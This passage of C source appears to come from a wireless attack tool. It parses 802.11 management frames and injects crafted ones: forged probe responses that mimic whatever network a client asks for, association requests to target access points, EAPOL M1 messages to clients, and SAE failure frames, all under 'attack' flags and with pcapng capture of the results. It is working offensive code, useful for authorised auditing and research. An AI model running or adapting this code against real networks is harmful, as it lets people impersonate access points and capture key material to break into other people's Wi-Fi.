		fprintf(stdout, " [ASSOCIATIONRESPONSE, SEQUENCE %d]\n",
			macfrx->sequence >> 4);
	}
	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	return;
}

/*===========================================================================*/
static inline void send_associationrequest(uint8_t * macap)
{
	static int c;
	static mac_t *macftx;
	static aplist_t *zeiger;

	static const uint8_t associationrequestcapa[] = {
		0x31, 0x04, 0x0a, 0x00
	};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

	static const uint8_t associationrequestdata[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
		0x32, 0x04, 0x0c, 0x12, 0x18, 0x60,
		0x21, 0x02, 0x08, 0x14,
		0x24, 0x02, 0x01, 0x0d,
		0x2d, 0x1a, 0xad, 0x49, 0x17, 0xff, 0xff, 0x00, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		    0x00, 0x00,
		0x7f, 0x08, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
		0xdd, 0x1e, 0x00, 0x90, 0x4c, 0x33, 0xad, 0x49, 0x17, 0xff,
		    0xff, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00,
	};
#define ASSOCIATIONREQUEST_SIZE sizeof(associationrequestdata)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macap) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macap) == false)) {
		return;
	}

	if (checkpownedstaap(mac_mysta, macap) > 0) {
		return;
	}

	zeiger = aplist;
	for (c = 0; c < APLIST_MAX - 1; c++) {
		if (zeiger->timestamp == 0) {
			return;
		}
		if (memcmp(zeiger->addr, macfrx->addr2, 6) == 0) {
			memset(&packetout, 0,
			       HDRRT_SIZE + MAC_SIZE_NORM +
			       ASSOCIATIONREQUESTCAPA_SIZE +
			       ASSOCIATIONREQUEST_SIZE + ESSID_LEN_MAX +
			       RSN_LEN_MAX + 6);
			memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
			macftx = (mac_t *) (packetout + HDRRT_SIZE);
			macftx->type = IEEE80211_FTYPE_MGMT;
			macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
			memcpy(macftx->addr1, macap, 6);
			memcpy(macftx->addr2, &mac_mysta, 6);
			memcpy(macftx->addr3, macap, 6);
			macftx->duration = 0x013a;
			macftx->sequence = myassociationrequestsequence++ << 4;
			if (myassociationrequestsequence >= 4096) {
				myassociationrequestsequence = 0;
			}
			memcpy(&packetout[HDRRT_SIZE + MAC_SIZE_NORM],
			       &associationrequestcapa,
			       ASSOCIATIONREQUESTCAPA_SIZE);
			packetout[HDRRT_SIZE + MAC_SIZE_NORM +
				  ASSOCIATIONREQUESTCAPA_SIZE + 1] =
			    zeiger->essid_len;
			memcpy(&packetout
			       [HDRRT_SIZE + MAC_SIZE_NORM +
				ASSOCIATIONREQUESTCAPA_SIZE + 2], zeiger->essid,
			       zeiger->essid_len);
			memcpy(&packetout
			       [HDRRT_SIZE + MAC_SIZE_NORM +
				ASSOCIATIONREQUESTCAPA_SIZE +
				zeiger->essid_len + 2], &associationrequestdata,
			       ASSOCIATIONREQUEST_SIZE);
			packetout[HDRRT_SIZE + MAC_SIZE_NORM +
				  ASSOCIATIONREQUESTCAPA_SIZE +
				  zeiger->essid_len + 2 +
				  ASSOCIATIONREQUEST_SIZE] = TAG_RSN;
			packetout[HDRRT_SIZE + MAC_SIZE_NORM +
				  ASSOCIATIONREQUESTCAPA_SIZE +
				  zeiger->essid_len + 2 +
				  ASSOCIATIONREQUEST_SIZE + 1] =
			    zeiger->rsn_len;
			memcpy(&packetout
			       [HDRRT_SIZE + MAC_SIZE_NORM +
				ASSOCIATIONREQUESTCAPA_SIZE +
				zeiger->essid_len + 2 +
				ASSOCIATIONREQUEST_SIZE + 1 + 1], zeiger->rsn,
			       zeiger->rsn_len);
			if (write
			    (fd_socket, packetout,
			     HDRRT_SIZE + MAC_SIZE_NORM +
			     ASSOCIATIONREQUESTCAPA_SIZE + zeiger->essid_len +
			     2 + ASSOCIATIONREQUEST_SIZE + 1 + 1 +
			     zeiger->rsn_len) < 0) {
				perror
				    ("\nfailed to transmit associationrequest");
				errorcount++;
				outgoingcount--;
			}
			outgoingcount++;
			fsync(fd_socket);
			return;
		}
		zeiger++;
	}
	return;
}

/*===========================================================================*/
static inline void process80211association_req()
{
	static uint8_t *essidtagptr;
	static ietag_t *essidtag;
	static uint8_t *associationrequestptr;
	static int associationrequestlen;

	if (attackclientflag == false) {
		send_associationresponse(macfrx->addr2, macfrx->addr1);
		usleep(M1WAITTIME);
		send_m1(macfrx->addr2, macfrx->addr1);
	}

	if (payload_len < (int) CAPABILITIESSTA_SIZE) {
		return;
	}
	associationrequestptr = payload_ptr + CAPABILITIESSTA_SIZE;
	associationrequestlen = payload_len - CAPABILITIESSTA_SIZE;
	if (associationrequestlen < (int) IETAG_SIZE) {
		return;
	}

	essidtagptr =
	    gettag(TAG_SSID, associationrequestptr, associationrequestlen);
	if (essidtagptr == NULL) {
		return;
	}
	essidtag = (ietag_t *) essidtagptr;
	if (essidtag->len > ESSID_LEN_MAX) {
		return;
	}
	if ((essidtag->len == 0) || (essidtag->len > ESSID_LEN_MAX)
	    || (essidtag->data[0] == 0)) {
		return;
	}

	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}

	if ((statusout & STATUS_ASSOC) == STATUS_ASSOC) {
		printtimenet(macfrx->addr1, macfrx->addr2);
		printessid(essidtag->len, essidtag->data);
		fprintf(stdout, " [ASSOCIATIONREQUEST, SEQUENCE %d]\n",
			macfrx->sequence >> 4);
	}
	return;
}

/*===========================================================================*/
static inline void process80211authentication()
{
	static authf_t *auth;

	auth = (authf_t *) payload_ptr;
	if (payload_len < (int) AUTHENTICATIONFRAME_SIZE) {
		return;
	}

	if (macfrx->protected == 1) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout,
				" [AUTHENTICATION, SHARED KEY ENCRYPTED KEY INSIDE], STATUS %d, SEQUENCE %d]\n",
				auth->statuscode, macfrx->sequence >> 4);
		}
	} else if (auth->authentication_algho == OPEN_SYSTEM) {
		if (attackapflag == false) {
			if (memcmp(macfrx->addr1, &mac_mysta, 6) == 0) {
				send_associationrequest(macfrx->addr2);
			}
		}
		if (attackclientflag == false) {
			if (auth->authentication_seq == 1) {
				if (memcmp(macfrx->addr2, &mac_mysta, 6) != 0) {
					send_authenticationresponseopensystem
					    (macfrx->addr2, macfrx->addr1);
				}
			}
		}
		if (fd_pcapng != 0) {
			if (payload_len > 6) {
				if (memcmp(macfrx->addr2, &mac_mysta, 6) != 0) {
					writeepb(fd_pcapng);
				}
			}
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout,
				" [AUTHENTICATION, OPEN SYSTEM, STATUS %d, SEQUENCE %d]\n",
				auth->statuscode, macfrx->sequence >> 4);
		}
	} else if (auth->authentication_algho == SAE) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			if (auth->authentication_seq == 1) {
				printtimenet(macfrx->addr1, macfrx->addr2);
				fprintf(stdout,
					" [AUTHENTICATION, SAE COMMIT, STATUS %d, SEQUENCE %d]\n",
					auth->statuscode,
					macfrx->sequence >> 4);
			} else if (auth->authentication_seq == 2) {
				if (memcmp(macfrx->addr1, macfrx->addr3, 6) ==
				    0) {
					send_saefailure(macfrx->addr2,
							macfrx->addr1,
							macfrx->sequence >> 4);
				}
				printtimenet(macfrx->addr1, macfrx->addr2);
				fprintf(stdout,
					" [AUTHENTICATION, SAE CONFIRM, STATUS %d, SEQUENCE %d]\n",
					auth->statuscode,
					macfrx->sequence >> 4);
			}
		}
	} else if (auth->authentication_algho == SHARED_KEY) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout,
				" [AUTHENTICATION, SHARED KEY, STATUS %d, SEQUENCE %d]\n",
				auth->statuscode, macfrx->sequence >> 4);
		}
	} else if (auth->authentication_algho == FBT) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout,
				" [AUTHENTICATION, FAST TRANSITION, STATUS %d, SEQUENCE %d]\n",
				auth->statuscode, macfrx->sequence >> 4);
		}
	} else if (auth->authentication_algho == FILS) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout,
				" [AUTHENTICATION, FILS, STATUS %d, SEQUENCE %d]\n",
				auth->statuscode, macfrx->sequence >> 4);
		}
	} else if (auth->authentication_algho == FILSPFS) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout,
				" [AUTHENTICATION, FILS PFS, STATUS %d, SEQUENCE %d]\n",
				auth->statuscode, macfrx->sequence >> 4);
		}
	} else if (auth->authentication_algho == FILSPK) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout,
				" [AUTHENTICATION, FILS PK, STATUS %d, SEQUENCE %d]\n",
				auth->statuscode, macfrx->sequence >> 4);
		}
	} else if (auth->authentication_algho == NETWORKEAP) {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
		if ((statusout & STATUS_AUTH) == STATUS_AUTH) {
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout,
				" [AUTHENTICATION, NETWORK EAP, STATUS %d, SEQUENCE %d]\n",
				auth->statuscode, macfrx->sequence >> 4);
		}
	} else {
		if (fd_pcapng != 0) {
			writeepb(fd_pcapng);
		}
	}
	return;
}

/*===========================================================================*/
static inline void process80211probe_resp()
{
	static aplist_t *zeiger;
	static uint8_t *apinfoptr;
	static int apinfolen;
	static uint8_t *essidtagptr;
	static ietag_t *essidtag = NULL;
	static uint8_t *channeltagptr;
	static ietag_t *channeltag = NULL;
	static uint8_t *rsntagptr;
	static ietag_t *rsntag = NULL;

	if (payload_len < (int) CAPABILITIESAP_SIZE) {
		return;
	}
	apinfoptr = payload_ptr + CAPABILITIESAP_SIZE;
	apinfolen = payload_len - CAPABILITIESAP_SIZE;
	if (apinfolen < (int) IETAG_SIZE) {
		return;
	}

	for (zeiger = aplist; zeiger < aplist + APLIST_MAX; zeiger++) {
		if (zeiger->timestamp == 0) {
			aplist_ptr = zeiger;
			break;
		}
		if (memcmp(zeiger->addr, macfrx->addr2, 6) == 0) {
			zeiger->timestamp = timestamp;
			if ((zeiger->essid_len == 0) || (zeiger->essid[0] == 0)) {
				essidtagptr =
				    gettag(TAG_SSID, apinfoptr, apinfolen);
				if (essidtagptr != NULL) {
					essidtag = (ietag_t *) essidtagptr;
					if (essidtag->len <= ESSID_LEN_MAX) {
						zeiger->essid_len =
						    essidtag->len;
						memcpy(zeiger->essid,
						       essidtag->data,
						       essidtag->len);
					}
				}
			}
			if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
				zeiger->status = 1;
				return;
			}
			if (((zeiger->count % apattacksintervall) == 0)
			    && (zeiger->count <
				(apattacksmax * apattacksintervall))) {
				if (attackapflag == false) {
					send_directed_proberequest(macfrx->
								   addr2,
								   zeiger->
								   essid_len,
								   zeiger->
								   essid);
					zeiger->status = 0;
				}
			}
			zeiger->count++;
			return;
		}
	}

	if ((aplist_ptr - aplist) >= APLIST_MAX) {
		qsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_time);
		aplist_ptr = aplist;
	}

	memset(aplist_ptr, 0, APLIST_SIZE);

	aplist_ptr->timestamp = timestamp;
	if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
		aplist_ptr->status = 1;
	}
	memcpy(aplist_ptr->addr, macfrx->addr2, 6);

	aplist_ptr->channel = channelscanlist[cpa];
	channeltagptr = gettag(TAG_CHAN, apinfoptr, apinfolen);
	if (channeltagptr != NULL) {
		channeltag = (ietag_t *) channeltagptr;
		aplist_ptr->channel = channeltag->data[0];
	}

	essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
	if (essidtagptr != NULL) {
		essidtag = (ietag_t *) essidtagptr;
		if (essidtag->len <= ESSID_LEN_MAX) {
			aplist_ptr->essid_len = essidtag->len;
			memcpy(aplist_ptr->essid, essidtag->data,
			       essidtag->len);
		}
	}

	rsntagptr = gettag(TAG_RSN, apinfoptr, apinfolen);
	if (rsntagptr != NULL) {
		rsntag = (ietag_t *) rsntagptr;
		if ((rsntag->len >= 20) && (rsntag->len <= RSN_LEN_MAX)) {
			aplist_ptr->rsn_len = rsntag->len;
			memcpy(aplist_ptr->rsn, rsntag->data, rsntag->len);
		}
	}

	if (attackapflag == false) {
		if (memcmp(&mac_mysta, macfrx->addr1, 6) != 0) {
			send_directed_proberequest(macfrx->addr2, essidtag->len,
						   essidtag->data);
		}
		aplist_ptr->count = 1;
	}
	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	if ((statusout & STATUS_PROBES) == STATUS_PROBES) {
		printtimenet(macfrx->addr1, macfrx->addr2);
		printessid(aplist_ptr->essid_len, aplist_ptr->essid);
		fprintf(stdout,
			" [PROBERESPONSE, SEQUENCE %d, AP CHANNEL %d]\n",
			macfrx->sequence >> 4, aplist_ptr->channel);
	}
	aplist_ptr++;
	return;
}

/*===========================================================================*/
static inline void send_proberesponse(uint8_t * macsta, uint8_t * macap,
				      uint8_t essid_len, uint8_t * essid)
{
	static mac_t *macftx;
	static capap_t *capap;

	const uint8_t proberesponsedata[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
		0x03, 0x01, 0x05,
		0x2a, 0x01, 0x00,
		0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
		0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47,
		    0x0d, 0x00,
		0x3d, 0x16, 0x05, 0x0d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
		0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00,
		    0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
		0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
		0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff,
		    0x7f,
		0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x01, 0x00,
		    0x00, 0x00, 0x00, 0x00,
		0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
		    0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
		0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
		0xdd, 0x6f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01,
		    0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
		0x10, 0x3b, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00, 0x10, 0xd5,
		    0x6c, 0x63, 0x68, 0xb0, 0x16, 0xf7,
		0xc3, 0x09, 0x22, 0x34, 0x81, 0xc4, 0xe7, 0x99, 0x1b, 0x10,
		    0x21, 0x00, 0x03, 0x41, 0x56, 0x4d,
		0x10, 0x23, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x24,
		    0x00, 0x04, 0x30, 0x30, 0x30, 0x30,
		0x10, 0x42, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x54,
		    0x00, 0x08, 0x00, 0x06, 0x00, 0x50,
		0xf2, 0x04, 0x00, 0x01, 0x10, 0x11, 0x00, 0x04, 0x46, 0x42,
		    0x6f, 0x78, 0x10, 0x08, 0x00, 0x02,
		0x23, 0x88, 0x10, 0x3c, 0x00, 0x01, 0x01, 0x10, 0x49, 0x00,
		    0x06, 0x00, 0x37, 0x2a, 0x00, 0x01,
		0x20
	};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

	static uint8_t packetout[1024];

	if ((filtermode == 1) && (checkfilterlistentry(macsta) == true)) {
		return;
	}
	if ((filtermode == 2) && (checkfilterlistentry(macsta) == false)) {
		return;
	}
	if (checkpownedstaap(macsta, macap) >= 3) {
		return;
	}

	memset(&packetout, 0,
	       HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE +
	       ESSID_LEN_MAX + IETAG_SIZE + 1);
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	macftx = (mac_t *) (packetout + HDRRT_SIZE);
	macftx->type = IEEE80211_FTYPE_MGMT;
	macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
	memcpy(macftx->addr1, macsta, 6);
	memcpy(macftx->addr2, macap, 6);
	memcpy(macftx->addr3, macap, 6);
	macftx->sequence = myproberesponsesequence++ << 4;
	if (myproberesponsesequence >= 4096) {
		myproberesponsesequence = 0;
	}
	capap = (capap_t *) (packetout + HDRRT_SIZE + MAC_SIZE_NORM);
	capap->timestamp = mytime;
	capap->beaconintervall = 0x640;
	capap->capabilities = 0x431;

	packetout[HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE] = 0;
	packetout[HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE + 1] =
	    essid_len;
	memcpy(&packetout
	       [HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE + IETAG_SIZE],
	       essid, essid_len);
	memcpy(&packetout
	       [HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE + IETAG_SIZE +
		essid_len], &proberesponsedata, PROBERESPONSE_SIZE);
	packetout[HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE +
		  IETAG_SIZE + essid_len + 0x0c] = channelscanlist[cpa];
	if (write
	    (fd_socket, packetout,
	     HDRRT_SIZE + MAC_SIZE_NORM + CAPABILITIESAP_SIZE + IETAG_SIZE +
	     essid_len + PROBERESPONSE_SIZE) < 0) {
		perror("\nfailed to transmit proberesponse");
		errorcount++;
		outgoingcount--;
	}
	fsync(fd_socket);
	outgoingcount++;
	return;
}

/*===========================================================================*/
static inline void process80211probe_req()
{
	static uint8_t *essidtagptr;
	static ietag_t *essidtag;
	static myaplist_t *zeiger;

	if (payload_len < (int) IETAG_SIZE) {
		return;
	}
	essidtagptr = gettag(TAG_SSID, payload_ptr, payload_len);
	if (essidtagptr == NULL) {
		return;
	}

	essidtag = (ietag_t *) essidtagptr;
	if ((essidtag->len == 0) || (essidtag->len > ESSID_LEN_MAX)
	    || (essidtag->data[0] == 0)) {
		return;
	}

	for (zeiger = myaplist; zeiger < myaplist + MYAPLIST_MAX; zeiger++) {
		if (zeiger->timestamp == 0) {
			myaplist_ptr = zeiger;
			break;
		}
		if ((zeiger->essid_len == essidtag->len)
		    && (memcmp(zeiger->essid, essidtag->data, essidtag->len) ==
			0)) {
			zeiger->timestamp = timestamp;
			send_proberesponse(macfrx->addr2, zeiger->addr,
					   zeiger->essid_len, zeiger->essid);
			return;
		}
	}

	if ((myaplist_ptr - myaplist) >= MYAPLIST_MAX) {
		qsort(myaplist, MYAPLIST_MAX, MYAPLIST_SIZE,
		      sort_myaplist_by_time);
		myaplist_ptr = myaplist;
	}

	memset(myaplist_ptr, 0, MYAPLIST_SIZE);
	myaplist_ptr->timestamp = timestamp;
	mynicap++;
	myaplist_ptr->addr[5] = mynicap & 0xff;
	myaplist_ptr->addr[4] = (mynicap >> 8) & 0xff;
	myaplist_ptr->addr[3] = (mynicap >> 16) & 0xff;
	myaplist_ptr->addr[2] = myouiap & 0xff;
	myaplist_ptr->addr[1] = (myouiap >> 8) & 0xff;
	myaplist_ptr->addr[0] = (myouiap >> 16) & 0xff;
	myaplist_ptr->essid_len = essidtag->len;
	memcpy(myaplist_ptr->essid, essidtag->data, essidtag->len);
	send_proberesponse(macfrx->addr2, myaplist_ptr->addr,
			   myaplist_ptr->essid_len, myaplist_ptr->essid);

	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	if ((statusout & STATUS_PROBES) == STATUS_PROBES) {
		printtimenet(macfrx->addr1, macfrx->addr2);
		printessid(myaplist_ptr->essid_len, myaplist_ptr->essid);
		fprintf(stdout, " [PROBEREQUEST, SEQUENCE %d]\n",
			macfrx->sequence >> 4);
	}
	aplist_ptr++;
	return;
}

/*===========================================================================*/
static inline void process80211directed_probe_req()
{
	static uint8_t *essidtagptr;
	static ietag_t *essidtag;
	static myaplist_t *zeiger;

	if (payload_len < (int) IETAG_SIZE) {
		return;
	}
	essidtagptr = gettag(TAG_SSID, payload_ptr, payload_len);
	if (essidtagptr == NULL) {
		return;
	}
	essidtag = (ietag_t *) essidtagptr;
	if ((essidtag->len == 0) || (essidtag->len > ESSID_LEN_MAX)
	    || (essidtag->data[0] == 0)) {
		return;
	}

	for (zeiger = myaplist; zeiger < myaplist + MYAPLIST_MAX; zeiger++) {
		if (zeiger->timestamp == 0) {
			myaplist_ptr = zeiger;
			break;
		}
		if ((memcmp(zeiger->addr, macfrx->addr1, 6) == 0)
		    && (zeiger->essid_len == essidtag->len)
		    && (memcmp(zeiger->essid, essidtag->data, essidtag->len) ==
			0)) {
			zeiger->timestamp = timestamp;
			send_proberesponse(macfrx->addr2, zeiger->addr,
					   zeiger->essid_len, zeiger->essid);
			return;
		}
	}

	if ((myaplist_ptr - myaplist) >= MYAPLIST_MAX) {
		qsort(myaplist, MYAPLIST_MAX, MYAPLIST_SIZE,
		      sort_myaplist_by_time);
		myaplist_ptr = myaplist;
	}

	memset(myaplist_ptr, 0, MYAPLIST_SIZE);
	myaplist_ptr->timestamp = timestamp;
	memcpy(myaplist_ptr->addr, macfrx->addr1, 6);
	myaplist_ptr->essid_len = essidtag->len;
	memcpy(myaplist_ptr->essid, essidtag->data, essidtag->len);
	send_proberesponse(macfrx->addr2, myaplist_ptr->addr,
			   myaplist_ptr->essid_len, myaplist_ptr->essid);
	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	if ((statusout & STATUS_PROBES) == STATUS_PROBES) {
		printtimenet(macfrx->addr1, macfrx->addr2);
		printessid(aplist_ptr->essid_len, aplist_ptr->essid);
		fprintf(stdout, " [PROBEREQUEST, SEQUENCE %d]\n",
			macfrx->sequence >> 4);
	}
	aplist_ptr++;
	return;
}

/*===========================================================================*/
static inline void process80211rcascanproberesponse()
{
	static aplist_t *zeiger;
	static uint8_t *apinfoptr;
	static int apinfolen;
	static uint8_t *essidtagptr;
	static ietag_t *essidtag = NULL;
	static uint8_t *channeltagptr;
	static ietag_t *channeltag = NULL;
	static uint8_t *rsntagptr;
	static ietag_t *rsntag = NULL;

	if (payload_len < (int) CAPABILITIESAP_SIZE) {
		return;
	}
	apinfoptr = payload_ptr + CAPABILITIESAP_SIZE;
	apinfolen = payload_len - CAPABILITIESAP_SIZE;
	if (apinfolen < (int) IETAG_SIZE) {
		return;
	}

	for (zeiger = aplist; zeiger < aplist + APLIST_MAX; zeiger++) {
		if (zeiger->timestamp == 0) {
			aplist_ptr = zeiger;
			break;
		}
		if (memcmp(zeiger->addr, macfrx->addr2, 6) == 0) {
			zeiger->timestamp = timestamp;
			if ((zeiger->essid_len == 0) || (zeiger->essid[0] == 0)) {
				essidtagptr =
				    gettag(TAG_SSID, apinfoptr, apinfolen);
				if (essidtagptr != NULL) {
					essidtag = (ietag_t *) essidtagptr;
					if (essidtag->len <= ESSID_LEN_MAX) {
						zeiger->essid_len =
						    essidtag->len;
						memcpy(zeiger->essid,
						       essidtag->data,
						       essidtag->len);
					}
				}
			}
			if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
				zeiger->status = 1;
				return;
			}
			if (((zeiger->count % apattacksintervall) == 0)
			    && (zeiger->count <
				(apattacksmax * apattacksintervall))) {
				if (attackapflag == false) {
					send_directed_proberequest(macfrx->
								   addr2,
								   zeiger->
								   essid_len,
								   zeiger->
								   essid);
					zeiger->status = 0;
				}
			}
			zeiger->count++;
			return;
		}
	}

	if ((aplist_ptr - aplist) >= APLIST_MAX) {
		qsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_time);
		aplist_ptr = aplist;
	}

	memset(aplist_ptr, 0, APLIST_SIZE);

	aplist_ptr->timestamp = timestamp;
	if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
		aplist_ptr->status = 1;
	}
	memcpy(aplist_ptr->addr, macfrx->addr2, 6);

	aplist_ptr->channel = channelscanlist[cpa];
	channeltagptr = gettag(TAG_CHAN, apinfoptr, apinfolen);
	if (channeltagptr != NULL) {
		channeltag = (ietag_t *) channeltagptr;
		aplist_ptr->channel = channeltag->data[0];
	}

	essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
	if (essidtagptr != NULL) {
		essidtag = (ietag_t *) essidtagptr;
		if (essidtag->len <= ESSID_LEN_MAX) {
			aplist_ptr->essid_len = essidtag->len;
			memcpy(aplist_ptr->essid, essidtag->data,
			       essidtag->len);
		}
	}

	rsntagptr = gettag(TAG_RSN, apinfoptr, apinfolen);
	if (rsntagptr != NULL) {
		rsntag = (ietag_t *) rsntagptr;
		if ((rsntag->len >= 20) && (rsntag->len <= RSN_LEN_MAX)) {
			aplist_ptr->rsn_len = rsntag->len;
			memcpy(aplist_ptr->rsn, rsntag->data, rsntag->len);
		}
	}

	if (attackapflag == false) {
		if (memcmp(&mac_mysta, macfrx->addr1, 6) != 0) {
			send_directed_proberequest(macfrx->addr2, essidtag->len,
						   essidtag->data);
		}
		aplist_ptr->count++;
	}
	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	aplist_ptr++;
	aplistcount++;
	if (aplistcount > APLIST_MAX) {
		aplistcount = APLIST_MAX;
	}
	return;
}

/*===========================================================================*/
static inline void process80211rcascanbeacon()
{
	static aplist_t *zeiger;
	static uint8_t *apinfoptr;
	static int apinfolen;
	static uint8_t *essidtagptr;
	static ietag_t *essidtag = NULL;
	static uint8_t *channeltagptr;
	static ietag_t *channeltag = NULL;
	static uint8_t *rsntagptr;
	static ietag_t *rsntag = NULL;

	if (payload_len < (int) CAPABILITIESAP_SIZE) {
		return;
	}
	apinfoptr = payload_ptr + CAPABILITIESAP_SIZE;
	apinfolen = payload_len - CAPABILITIESAP_SIZE;
	if (apinfolen < (int) IETAG_SIZE) {
		return;
	}

	for (zeiger = aplist; zeiger < aplist + APLIST_MAX; zeiger++) {
		if (zeiger->timestamp == 0) {
			aplist_ptr = zeiger;
			break;
		}
		if (memcmp(zeiger->addr, macfrx->addr2, 6) == 0) {
			if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
				zeiger->status = 1;
			}
			if (((zeiger->count % apattacksintervall) == 0)
			    && (zeiger->count <
				(apattacksmax * apattacksintervall))) {
				if (attackapflag == false) {
					zeiger->status = 0;
					send_directed_proberequest(macfrx->
								   addr2,
								   zeiger->
								   essid_len,
								   zeiger->
								   essid);
				}
			}
			zeiger->count++;
			return;
		}
	}

	if ((aplist_ptr - aplist) >= APLIST_MAX) {
		qsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_time);
		aplist_ptr = aplist;
	}

	memset(aplist_ptr, 0, APLIST_SIZE);
	aplist_ptr->timestamp = timestamp;
	if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
		aplist_ptr->status = 1;
	}
	memcpy(aplist_ptr->addr, macfrx->addr2, 6);

	aplist_ptr->channel = channelscanlist[cpa];
	channeltagptr = gettag(TAG_CHAN, apinfoptr, apinfolen);
	if (channeltagptr != NULL) {
		channeltag = (ietag_t *) channeltagptr;
		aplist_ptr->channel = channeltag->data[0];
	}

	essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
	if (essidtagptr != NULL) {
		essidtag = (ietag_t *) essidtagptr;
		if (essidtag->len <= ESSID_LEN_MAX) {
			aplist_ptr->essid_len = essidtag->len;
			memcpy(aplist_ptr->essid, essidtag->data,
			       essidtag->len);
		}
	}

	rsntagptr = gettag(TAG_RSN, apinfoptr, apinfolen);
	if (rsntagptr != NULL) {
		rsntag = (ietag_t *) rsntagptr;
